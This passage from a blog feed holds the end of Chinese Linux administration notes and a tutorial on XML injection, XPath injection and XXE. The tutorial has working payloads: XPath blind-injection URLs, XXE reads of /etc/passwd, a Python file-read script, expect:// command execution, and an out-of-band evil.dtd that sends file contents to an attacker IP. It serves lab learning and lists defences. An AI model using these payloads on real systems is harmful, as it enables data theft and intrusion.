-tlun 查看本机所有监听端口-t tcp -u udp -l 监听 -n 以 IP 和端口号显示 9、关机、重启命令关机命令：shutdown -h nowinit 0haltpoweroff 重启命令：shutdown -r nowrebootinit 6 10、挂载命令首先选择光盘镜像，然后连接光盘镜像，最后挂载挂载光盘 mkdir /mnt/cdrommount /dev/cdrom /mnt/cdrom 卸载光盘 umount /dev/cdromumount /mnt/cdrom 二、软件安装rpm包安装1、挂载光盘2、进入/mnt/cdrom/Server/3、执行命令rpm -ivh 包全名-i install安装-v 显示更详细信息-h 打印#显示安装进度4、服务启动service 服务名 start|stop|restart|status 三、用户管理1、用户相关文件/etc/passwd 用户信息文件root:x:0:0:root:/root:/bin/bash第一列：用户名第二列：密码位第三列：用户 ID /etc/shadow 影子文件root:$6$9w5Td6lg$bgpsy3olsq9WwWvS5Sst2W3ZiJpuCGDY.4w4MRk3ob/i85fI38RH15wzVoomff 9isV1PzdcXmixzhnMVhMxbv0:15775:0:99999:7:::第一列：用户名第二列：加密密码 /etc/group 组信息文件root:x:0:root第一列：组名第二列：组密码位第三列：GID第四列：此组中支持的其他用户.附加组是此组的用户 /etc/gshadow 组密码文件 2、用户管理命令1.添加用户添加用户：useradd 用户名手工指定选项添加用户：创建用户组lamp1：groupadd 组名建立用户qwzf：useradd -u 550 -g lamp1 -G root -d /home/lamp1 -c \"test user\" -s /bin/bash qwzf 同时查看三个文件：grep \"qwzf\" /etc/passwd /etc/shadow /etc/group 查看用户家目录：ll -d /home/qwzf2.设置密码passwd 用户名3.用户信息修改usermod -L 用户名 锁定用户usermod -U 用户名 解锁usermod -l 新名 旧名 用户改名4.删除用户userdel -r 用户名5.添加组groupadd 组名6.删除组groupdel 组名(必须是空组)7.把已经存在的用户加入组usermod -G 组名 用户名gpasswd -a 用户名 组名把用户从组中删除：gpasswd -d 用户名 组名3、用户权限赋予例：/test 目录，要求aa、bb、cc有rwx。useradd aa (bb、cc)passwd aa (bb、cc)groupadd testgrpgpasswd -a aa testgrp 把aa、bb、cc、加入组chmod 770 /test 修改组权限chgrp testgrp /test 修改属组 四、权限管理1、ACL权限getfacl 文件名 查询文件的acl权限setfacl 选项(-m设定权限、-b删除权限) 文件名 设定acl权限1.设置acl权限setfacl -m u:用户名:权限 文件名如：setfacl -m u:qwzf:rwx /test给test目录赋予qwzf是rwx的acl权限setfacl -m g:组名:权限 文件名2.删除acl权限setfacl -b 文件名3.acl默认权限默认权限只能赋予目录如：setfacl -m d:u:aa:rwx -R /test2、sudo授权/sbin/ 在此目录下命令只有超级用户才能使用/usr/sbin/1.赋予普通用户权限命令visudo如：让qwzf用户有root所有权限useradd qwzfpasswd qwzfvisudo添加一行如下信息：qwzf ALL=(ALL) ALL 让qwzf用户可以添加其他普通用户：qwzf ALL=/usr/sbin/useraddqwzf ALL=/usr/bin/passwd 执行sudo /usr/sbin/useradd aaqwzf用户添加aa用户3、文件特殊权限SetUID、SetGID、Sticky BIT1.SetUID（1）命令执行者要对该程序有x(执行)权限（2）命令执行者在执行该程序时获得该程序文件属主的身份。（3）SetUID权限只在该程序执行过程中有效。如：qwzf对/usr/bin/vi具有执行权限chmod u+s /usr/bin/vi 执行完之后，qwzf执行vi，实际以root身份执行 2.SetGID针对文件的作用（1）命令执行者要对该程序有x(执行)权限（2）命令执行者在执行该程序时组身份升级为该程序文件的属组。（3）SetGID权限只在该程序执行过程中有效。ll /usr/bin/locate qwzf用户执行该命令时，组身份会升级为slocate组 针对目录的作用（1）普通用户对此目录有rx权限，才能进入此目录（2）普通用户在此目录的有效组会变成此目录的属组（3）若普通用户对此目录有w权限，新建文件默认属组是这个目录的属组。如：mkdir /dtestchmod g+s /dtestchmod 777 /dtest/ 让普通用户可以写 3.Sticky BIT4：SUID2：SGID1：SBIT赋予SUID权限chmod 4755 ftest赋予SGID权限chmod 2755 ftest赋予SBIT权限SBIT只对目录有效chmod 1755 dtest/ 五、文件系统管理1、常用磁盘管理命令1.df命令df -ahT-a 显示特殊文件系统-h 单位不再只用KB，换成习惯单位-T 多了文件系统类型一列2.du命令du [选项][目录或文件名]-a 显示每个子文件的磁盘占用量-h 使用习惯单位显示磁盘占用量-s 统计总占用量，而不列出子目录和子文件的占用量3.fsck文件系统修复命令fsck -y /dev/sdb1 4.显示磁盘状态dumpe2fs /dev/sda2 5.查看文件的详细时间stat 文件名6.判断文件类型file 文件名 判断文件类型type 命令名 判断命令类型2、fdisk命令手工分区1.fdisk -l 查看系统所有硬盘及分区2.fdisk /dev/sdb 进行磁盘分区n-&gt;p-&gt;1(分区好)-&gt;1-&gt;100-&gt;w 分区大小+100M改变文件系统：n-&gt;p-&gt;1(分区号)-&gt;1-&gt;200-&gt;t-&gt;8e-&gt;w 3.partprobe强制重读所有分区文件，重新挂载分区文件内所有分区4.格式化分区mkfs.ext3 /dev/sdb15.建立挂载点和挂载mkdir /disk1mount /dev/sdb1 /disk16.查看mount 查看所有已经挂载的分区和光盘fdisk -l 查看系统分区df 查看分区占用百分比7、自动挂载修改分区自动挂载文件vi /etc/fstab8、重启测试mount -a 重新挂载所有内容，用它进行测试 六、高级文件系统管理1、磁盘配额1.分区、格式化、挂载、(查看)分区：fdisk /dev/sdbn-&gt;p-&gt;1(分区号)-&gt;1-&gt;100-&gt;w格式化：mkfs.ext3 /dev/sdb1挂载：mkdir /disk1mount /dev/sdb1 /disk1查看：mount | tail -12.磁盘配额的设置（1）开启配额功能，并建立磁盘配额的配置文件（2）设置用户和组的配额限制（3）给用户配额限制：磁盘空间软限制80MB，硬限制100MB（4）以用户wmm1身份登陆系统进行验证。创建120MB的testfile文件2、LVM卷的创建和管理1.创建3个分区，并设置System为Linux LVMfdisk /dev/sdbn-&gt;p-&gt;1(分区号)-&gt;1-&gt;200-&gt;t-&gt;8e-&gt;w2.建立物理卷，建立一个名为scvg卷组3.建立逻辑卷，建立一个wmmlv的逻辑卷。并格式化、挂载、查看3、raid5卷的创建和使用1.使用3块硬盘，建立四个分区2.建立RAID 5，并查看3.格式化与挂载RAID，并查看4.设置开机自动挂载vi /etc/fstab 七、系统管理定时任务 八、日志管理常用日志文件： /var/log/apache2//usr/local/apache2/logs/usr/nginx/logs/ 九、备份管理","categories":[{"name":"Linux","slug":"Linux","permalink":"https://qwzf.gitee.io/blog/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://qwzf.gitee.io/blog/tags/Linux/"},{"name":"期末复习","slug":"期末复习","permalink":"https://qwzf.gitee.io/blog/tags/期末复习/"}],"author":"qwzf"},{"title":"从XML相关一步一步到XXE漏洞","slug":"从XML相关一步一步到XXE漏洞","date":"2019-12-02T06:47:00.808Z","updated":"2019-12-02T07:03:35.716Z","comments":true,"path":"2019/12/02/从XML相关一步一步到XXE漏洞/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/12/02/从XML相关一步一步到XXE漏洞/","excerpt":"","text":"0x00 前言想学XXE漏洞，XXE(XML External Entity Injection)全称为XML外部实体注入。XML？！发现我不会，简单看了一下基础知识，发现XML还可能存在XML注入和XPath注入。于是把XML注入、XPath注入和XML 外部实体注入一起学习了！并写了一下学习笔记。 0x01 XML什么是 XML？XML 指可扩展标记语言（EXtensible Markup Language）。XML 的设计宗旨是传输数据，而不是显示数据。XML 是 W3C 的推荐标准。XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。XML 语言没有预定义的标签。 XML 和 HTML 之间的差异XML 不是 HTML 的替代。XML 和 HTML 为不同的目的而设计： XML 被设计用来传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观。HTML 旨在显示信息，而 XML 旨在传输信息。 为什么需要XML现实生活中一些数据之间往往存在一定的关系。我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。 XML基本格式与基本语法基本格式：&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;&lt;!--xml文件的声明--&gt;&lt;bookstore&gt; &lt;!--根元素--&gt;&lt;book category=\"COOKING\"&gt; &lt;!--bookstore的子元素，category为属性--&gt;&lt;title&gt;Everyday Italian&lt;/title&gt; &lt;!--book的子元素，lang为属性--&gt;&lt;author&gt;Giada De Laurentiis&lt;/author&gt; &lt;!--book的子元素--&gt;&lt;year&gt;2005&lt;/year&gt; &lt;!--book的子元素--&gt;&lt;price&gt;30.00&lt;/price&gt; &lt;!--book的子元素--&gt;&lt;/book&gt; &lt;!--book的结束--&gt;&lt;/bookstore&gt; &lt;!--bookstore的结束--&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。 基本语法： 所有 XML 元素都须有关闭标签。 XML 标签对大小写敏感。 XML 必须正确地嵌套。 XML 文档必须有根元素。 XML 的属性值须加引号。 若多个字符都需要转义，则可以将这些内容存放到CDATA里面&lt;![CDATA[ 内容 ]]&gt; 0x02 DTDDTD基本概念XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。实体引用XML元素以形如 &lt;tag&gt;foo&lt;/tag&gt; 的标签开始和结束，如果元素内部出现如&lt; 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot; 替换 &lt; &gt; &amp; &#39; &quot; 。实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。dtd的引入方式DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。内部 DTD使用内部的dtd文件，即将约束规则定义在xml文档中&lt;!DOCTYPE 根元素名称 [元素声明]&gt; 示例代码：&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt; 外部 DTD（1）引入外部的dtd文件&lt;!DOCTYPE 根元素名称 SYSTEM \"dtd路径\"&gt; （2）使用外部的dtd文件(网络上的dtd文件)&lt;!DOCTYPE 根元素 PUBLIC \"DTD名称\" \"DTD文档的URL\"&gt; 当使用外部DTD时，通过如下语法引入：&lt;!DOCTYPE root-element SYSTEM \"filename\"&gt; 示例代码：&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root-element SYSTEM \"test.dtd\"&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt; test.dtd&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt; PCDATAPCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。被解析的字符数据不应当包含任何&amp;，&lt;，或者&gt;字符，需要用&amp;amp; &amp;lt; &amp;gt;实体来分别替换。CDATACDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。DTD元素DTD属性属性声明语法：&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt; DTD实例：&lt;!ATTLIST payment Luckey CDATA \"Q\"&gt; XML实例：&lt;payment Luckey=\"Q\" /&gt; 以下是 属性类型的选项：默认属性值可使用下列值：DTD实体 实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体引用是对实体的引用。实体可在内部或外部进行声明。 按实体有无参分类，实体分为一般实体和参数实体一般实体的声明：&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;引用一般实体的方法：&amp;实体名称;ps：经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。 参数实体的声明：&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;引用参数实体的方法：%实体名称;ps：经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。 按实体使用方式分类，实体分为内部声明实体和引用外部实体内部实体&lt;!ENTITY 实体名称 \"实体的值\"&gt; 内部实体示例代码：&lt;?xml version = \"1.0\" encoding = \"utf-8\"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY writer \"Dawn\"&gt; &lt;!ENTITY copyright \"Copyright W3School.com.cn\"&gt;]&gt;&lt;test&gt;&amp;writer;©right;&lt;/test&gt; 外部实体外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机。&lt;!ENTITY 实体名称 SYSTEM \"URI/URL\"&gt;或者&lt;!ENTITY 实体名称 PUBLIC \"public_ID\" \"URI\"&gt; 外部实体示例代码：&lt;?xml version = \"1.0\" encoding = \"utf-8\"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt; &lt;!ENTITY copyright SYSTEM \"http://www.w3school.com.cn/dtd/entities.dtd\"&gt;]&gt;&lt;author&gt;&amp;file;©right;&lt;/author&gt; 外部实体可支持http、file等协议。不同程序支持的协议不同：PHP支持的协议会更多一些，但需要一定的扩展：PHP引用外部实体，常见的利用协议：file://文件绝对路径 如：file:///etc/passwdhttp://url/file.txtphp://filter/read=convert.base64-encode/resource=xxx.php 参数实体+外部实体&lt;!ENTITY % 实体名称 SYSTEM \"URI/URL\"&gt; 参数实体+外部实体示例代码：&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % file SYSTEM \"file:///etc/passwd\"&gt; %file;]&gt; %file(参数实体)是在DTD中被引用的，而&amp;file;是在xml文档中被引用的。 0x03 XML注入XML的设计宗旨是传输数据，而非显示数据。XML注入是一种古老的技术，通过利用闭合标签改写XML文件实现的。 XML注入简介XML是一种数据组织存储的数据结构方式，安全的XML在用户输入生成新的数据时候应该只能允许用户接受的数据，需要过滤掉一些可以改变XML标签也就是说改变XML结构插入新功能（例如新的账户信息，等于添加了账户）的特殊输入，如果没有过滤，则可以导致XML注入攻击。 XML注入前提条件（1）用户能够控制数据的输入（2）程序有拼凑的数据 注入实例test1.xml&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;manager&gt; &lt;admin id=\"1\"&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin&lt;/password&gt; &lt;/admin&gt; &lt;admin id=\"2\"&gt; &lt;username&gt;root&lt;/username&gt; &lt;password&gt;root&lt;/password&gt; &lt;/admin&gt;&lt;/manager&gt; XML与HTML一样，也存在注入攻击，在注入的方法上也非常相似。对于上面的xml文件，如果攻击者能够掌控password字段，那么就会产生XML注入。如攻击者输入：admin &lt;/password&gt;&lt;/admin&gt;&lt;admin id=\"3\"&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker&lt;/password&gt;&lt;/admin&gt; 最终修改结果为：&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;manager&gt; &lt;admin id=\"1\"&gt; &lt;name&gt;admin&lt;/name&gt; &lt;password&gt;admin&lt;/password&gt; &lt;/admin&gt; &lt;admin id=\"2\"&gt; &lt;username&gt;root&lt;/username&gt; &lt;password&gt;root&lt;/password&gt; &lt;/admin&gt; &lt;admin id=\"3\"&gt; &lt;name&gt;hack&lt;/name&gt; &lt;password&gt;hacker&lt;/password&gt; &lt;/admin&gt;&lt;/manager&gt; 这样就通过XML注入添加了一个名为hack、密码为：hacker的管理员账户。XML注入两大要素：标签闭合和获取XML表结构 XML注入防御（1）对用户的输入进行过滤（2）对用户的输入进行转义| 预定义字符 | 转以后的预定义字符 ||–|–||&lt;|&amp;lt;||&gt;|&amp;gt;||&amp;|&amp;amp;||&#39;|&amp;apos;||&quot;|&amp;quot;| 0x04 XPath注入XPath注入攻击简介XPath注入攻击是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。 XPath注入发生在当站点使用用户输入的信息来构造请求以获取XML数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的XML是如何构造的，从而进一步获取正常途径下无法获取的数据。当XML数据被用作账户验证时，攻击者还可以提升他的权限。 XPath注入攻击特点XPath注入攻击利用两种技术，即XPath扫描和 XPath查询布尔化。通过该攻击，攻击者可以控制用来进行XPath查询的XML数据库。这种攻击可以有效地对付使用XPath查询（和XML数据库） 来执行身份验证、查找或者其它操作。 XPath注入攻击同SQL注入攻击类似，但与SQL注入相比，XPath具有的优势： 广泛性只要是利用XPath语法的Web 应用程序若未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。而在SQL注入攻击过程中根据数据库支持的SQL语言不同，注入攻击的实现可能不同。 危害性大XPath语言几乎可以没有访问控制限制的引用XML文档的所有部分。而在SQL注入中，一个“用户”的权限可能被限制到 某一特定的表、列或者查询。XPath注入攻击可以保证得到完整的XML文档，即完整的数据库。只要Web服务应用具有基本的安全漏洞，即可构造针对 XPath应用的自动攻击。 Xpath注入攻击原理与利用XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作。注入对象不是数据库users表，而是一个存储数据的XML文件。因为xpath不存在访问控制，所以不会遇到许多在SQL注入中经常遇到的访问限制。 注入出现的位置也就是cookie，headers，request parameters/input等。Xpath基本语法xPath注入学习之基础语法学习 如果一个网站某应用程序将数据保存在XML中，并且对用户的输入没有做限制，攻击者提交了没有经过处理的输入，就插入到 XPath 查询中，即产生Xpath注入，那么就攻击者就可能通过控制查询，获取数据，或者删除数据之类的操作。 Xpath是xml路径语言，用于配置文件的查找。数据库就是xml文件。因此只要是利用XPath语法的Web 应用程序如果未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。比如一些登录地址页面，搜索页面需要与xml交互的位置。1、Xpath直接注入示例代码：test2.xml(存储用户名和密码)&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;root&gt; &lt;users&gt; &lt;user&gt; &lt;id&gt;1&lt;/id&gt; &lt;username&gt;test1&lt;/username&gt; &lt;password&gt;test1&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;id&gt;2&lt;/id&gt; &lt;username&gt;test2&lt;/username&gt; &lt;password&gt;test2&lt;/password&gt; &lt;/user&gt; &lt;/users&gt;&lt;/root&gt; 2.php(用于接收传入参数，并进行XML查询)&lt;?php$xml=simplexml_load_file('test2.xml');$name=$_GET['name'];$pwd=$_GET['pwd'];$query=\"/root/users/user[username/text()='\".$name.\"' and password/text()='\".$pwd.\"']\";echo $query;$result=$xml-&gt;xpath($query);if($result)&#123; echo '&lt;h2&gt;Welcome&lt;/h2&gt;'; foreach($result as $key=&gt;$value)&#123; echo '&lt;br /&gt;ID:'.$value-&gt;id; echo '&lt;br /&gt;Username:'.$value-&gt;username; &#125;&#125;?&gt; simplexml_load_file()函数返回类 SimpleXMLElement 的一个对象，该对象的属性包含 XML 文档中的数据 正常查询：/root/users/user[username/text()=&#39;test1&#39;and password/text()=&#39;test1&#39;]攻击者在username字段中输入：&#39; or 1=1 or &#39;&#39;=&#39;变成/root/users/user[username/text()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39; and password/text()=&#39;1&#39;]，成功获取所有user数据。上面这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath盲注技术获取最高权限帐号和其它重要文档信息。2、XPath盲注如果遍历出整个XML文档，一般步骤如下：1.盲注根节点利用count（/*）判断根下节点：http://127.0.0.1/xml/2.php?name=' or count(/*) = 1 or '1' = '2 有返回结果证明存在一个根节点。利用substring分割根节点的每个字符，猜解第一级节点：http://127.0.0.1/xml/2.php?name=' or substring(name(/*[position() = 1]),1,1)='r' or '1'='2http://127.0.0.1/xml/2.php?name=' or substring(name(/*[position() = 1]),2,1)='o' or '1'='2 …最终结果: root2.盲注root的下一级节点判断root的下一级节点数：http://127.0.0.1/xml/2.php?name=' or count(/root/*) = 1 or '1' = '2 有返回结果证明存在一个root的下一级节点。猜解root的下一级节点：http://127.0.0.1/xml/2.php?name=' or substring(name(/root/*[position() = 1]),1,1)='u' or '1'='2http://127.0.0.1/xml/2.php?name=' or substring(name(/root/*[position() = 1]),2,1)='s' or '1'='2 最终结果:users重复上述步骤，直至猜解出所有节点，最后来猜解节点中的数据或属性值。 Xpath注入攻击危害 在URL及表单中提交恶意XPath代码，可获取到权限限制数据的访问权，并可修改这些数据。 可通过此类漏洞查询获取到系统内部完整的XML文档内容。 逻辑以及认证被绕过，它不像数据库那样有各种权限，xml没有各种权限的概念,正因为没有权限概念，因此利用xpath构造查询的时候整个数据库都会被用户读取。 Xpath注入攻击防御 数据提交到服务器上端，在服务端正式处理这批数据之前，对提交数据的合法性进行验证。 检查提交的数据是否包含特殊字符，对特殊字符进行编码转换或替换、删除敏感字符或字符串。 对于系统出现的错误信息，以IE错误编码信息替换，屏蔽系统本身的出错信息。 参数化XPath查询，将需要构建的XPath查询表达式，以变量的形式表示，变量不是可以执行的脚本。 通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息。 总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量。 0x05 XML外部实体注入(XXE)XXE漏洞简介XXE漏洞全称XML External Entity Injection 即XML外部实体注入。XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。 XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞。simplexml_load_string()可以读取XML XXE本地搭建环境测试xxe.php&lt;?php$xmlfile=file_get_contents('php://input');$dom=new DOMDocument();$dom-&gt;loadXML($xmlfile);$xml=simplexml_import_dom($dom);$xxe=$xml-&gt;xxe;$str=\"$xxe \\n\";echo $str;?&gt; file_get_contents获取客户端输入内容 new DOMDocument()初始化XML解析器 loadXML($xmlfile)加载客户端输入的XML内容 simplexml_import_dom($dom)获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。 获取SimpleXMLElement对象中的节点XXE，然后输出XXE内容。 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM \"file:///d://qwzf.txt\"&gt;]&gt;&lt;xml&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&lt;/xml&gt; XXE常见利用方式与SQL相似，XXE漏洞也分为有回显和无回显有回显，可以直接在页面中看到payload的执行结果或现象。无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。 1、读取任意文件首先准备一个有XXE漏洞的文件，这里以php文件为例示例代码&lt;?php$xml = simplexml_load_string($_REQUEST['xml']);print_r($xml);//注释掉该语句即为无回显的情况?&gt; 构造payload&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY file SYSTEM \"file:///d://qwzf.txt\" &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;file;&lt;/name&gt;&lt;/root&gt; 读取文件，需URL编码后执行。通过构造外部实体payload，在 xml 中 &amp;file ; 变成了外部文件qwzf.txt中内容，导致敏感信息泄露。靶场练习使用一下靶场练习回显读取文件和无回显读取文件：xxe-lab输入，抓包发包，发现通过XML传输数据php源码&lt;?php$USERNAME = 'admin'; //账号$PASSWORD = 'admin'; //密码$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');try&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123; $result = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",1,$username); &#125;else&#123; $result = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",0,$username); &#125; &#125;catch(Exception $e)&#123; $result = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",3,$e-&gt;getMessage());&#125;header('Content-Type: text/html; charset=utf-8');echo $result;?&gt; 有回显 构造payload&lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY file SYSTEM \"file:///d:/qwzf.txt\"&gt;]&gt;&lt;user&gt; &lt;username&gt;&amp;file;&lt;/username&gt; &lt;password&gt;hack&lt;/password&gt;&lt;/user&gt; 当然，也可以使用php://filter协议读取qwzf.txt文件内容(也可以读取其他类型的文件，如：php文件)php://filter/read=convert.base64-encode/resource= 无回显 修改源码，禁掉输出代码和报错信息，改成无回显。遇到无回显，可以通过Blind XXE方法加上外带数据通道来提取数据，先使用php://filter协议获取目标文件的内容，然后将内容以http请求发送到攻击服务器来读取数据。虽无法直接查看文件内容，但我们可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码。即，当无回显情况时，可以将数据发送到远程服务器(攻击服务器)。 这里我使用的攻击机ip为：192.168.201.128 构造payload&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE test[&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=D:/qwzf.txt\"&gt;&lt;!ENTITY % dtd SYSTEM \"http://192.168.201.128/evil.dtd\"&gt;%dtd;%send;]&gt; 远程服务器部署evil.dtd内容为:&lt;!ENTITY % payload \"&lt;!ENTITY % send SYSTEM 'http://192.168.201.128/?content=%file;'&gt;\"&gt; %payload; %要进行实体编码&amp;#x25进行XXE攻击后，服务器会把文件内容发送到攻击者服务器(这里是ubantu的apache日志记录)ubantu查看apache日志记录命令：tail -f /var/log/apache2/access.log 无回显攻击流程： 先调用%dtd，请求远程服务器(攻击服务器)上的evil.dtd。 再调用 evil.dtd中的 %file。%file 获取受攻击的服务器上面的敏感文件，然后将 %file 的返回结果传到%send 。 然后调用 %send; 把读取到的数据发送到远程服务器上。 这样就实现了外带数据的效果，解决 XXE 无回显的问题。 使用并分析恶意脚本xxe2.php&lt;?php$data = file_get_contents('php://input');$xml = simplexml_load_string($data);echo $xml-&gt;name;?&gt; 读取文件.py#!/usr/bin/python# -*- coding:utf-8 -*-import urllib2if __name__ == '__main__': print u'输入要访问的地址，如http://127.0.0.1/xml/xxe2.php' url = raw_input() count=1 while count==1: print u'输入要读取的文件，如file:///etc/passwd' payload = raw_input() headers = &#123;'Content-type': 'text/xml'&#125; xml = '&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM \"' + payload + '\" &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;' req = urllib2.Request(url = url,headers = headers, data = xml) res_data = urllib2.urlopen(req) res = res_data.read() print res 通过urllib2的request方法用POST方式向目标地址发送XML数据，返回的数据即为服务器相关文件内容。 2、执行系统命令在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM \"expect://id\" &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; 通过XXE可以实现RCE的实例很少。 3、拒绝服务攻击(Dos)&lt;?xml version=\"1.0\"?&gt; 